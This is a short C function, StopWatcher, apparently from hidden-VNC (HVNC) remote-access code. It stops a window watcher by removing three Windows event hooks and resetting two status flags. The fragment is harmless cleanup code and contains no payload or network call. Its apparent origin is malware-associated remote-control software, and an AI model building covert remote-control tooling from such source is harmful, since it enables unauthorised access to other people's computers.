void StopWatcher(PHVNC lpServer)
{
    lpServer->WndWatcherInfo.bWatcherStarted=false;
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook1);
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook2);
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook3);
    lpServer->WndWatcherInfo.bMessageBoxIsShown=false;
    return;
}